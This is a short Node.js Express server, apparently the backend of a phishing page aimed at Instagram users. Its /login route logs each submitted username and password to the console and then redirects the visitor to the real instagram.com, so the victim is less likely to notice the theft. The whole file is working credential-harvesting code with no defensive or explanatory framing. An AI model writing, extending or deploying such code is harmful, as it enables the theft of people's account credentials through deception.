var express = require('express');
var app = express();
var path = require('path');

app.use(express.static('static'))

app.get('/login', (req, res) => {
  console.log('Received request to login')
  console.log(`username:${req.query.username},pw:${req.query.n}`)
  res.redirect("https://instagram.com")
})



app.listen(8080);